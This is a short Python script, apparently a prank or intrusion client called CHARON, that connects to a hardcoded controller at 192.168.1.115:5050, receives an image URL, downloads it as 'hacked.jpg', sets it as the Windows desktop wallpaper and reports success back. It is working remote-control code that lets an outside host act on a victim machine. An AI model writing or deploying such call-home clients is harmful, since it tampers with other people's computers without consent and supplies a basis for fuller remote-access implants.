# CHARON :
# socket program for changing windows background with given picture url from the web client side

from socket import *
import ctypes
import urllib.request

s = socket(AF_INET, SOCK_STREAM)

s.connect(('192.168.1.115',5050))

SPI_SETDESKWALLPAPER = 20 

image_url = s.recv(1024).decode('utf-8')

save_name = 'hacked.jpg' #local name to be saved

urllib.request.urlretrieve(image_url, save_name)

ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, save_name , 0)

s.sendall("changed background !".encode('utf-8'))

s.close()